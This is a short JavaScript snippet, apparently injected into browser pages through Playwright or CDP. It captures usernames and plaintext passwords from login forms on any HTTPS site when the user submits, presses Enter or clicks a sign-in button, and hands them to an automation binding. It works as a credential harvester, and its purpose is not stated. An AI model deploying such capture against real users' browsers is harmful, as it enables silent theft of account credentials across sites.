(() => {
  if (globalThis.__ruinCaptureInstalled) return;
  globalThis.__ruinCaptureInstalled = true;
  const visible = e => !!(e.getClientRects().length && !e.disabled);
  function capture(event) {
    if (location.protocol !== 'https:') return;
    if (event.type === 'keydown' && event.key !== 'Enter') return;
    const button = event.target.closest?.('button,input[type=submit],input[type=button],[role=button],a');
    if (event.type === 'click' && (!button || !(button.type === 'submit' ||
        /log\s*in|sign\s*in|continue|登录|登入/i.test(button.innerText || button.value || button.getAttribute('aria-label') || '')))) return;
    const scope = event.target.form || event.target.closest?.('form') || document;
    const passwords = [...scope.querySelectorAll('input[type=password]')].filter(visible);
    const password = passwords.find(e => e.value);
    if (!password) return;
    const candidates = [...scope.querySelectorAll('input')].filter(e => visible(e) &&
      ['text','email','tel'].includes(e.type));
    const username = candidates.find(e => /username|email/i.test(e.autocomplete + ' ' + e.name + ' ' + e.id)) ||
      candidates.filter(e => e.compareDocumentPosition(password) & Node.DOCUMENT_POSITION_FOLLOWING).at(-1);
    // The binding is provided by Playwright/CDP, not a network endpoint.
    globalThis.__ruinCapture({host: location.hostname, username: username?.value || '', password: password.value}).catch(() => {});
  }
  for (const event of ['submit','keydown','click']) addEventListener(event, capture, true);
})();
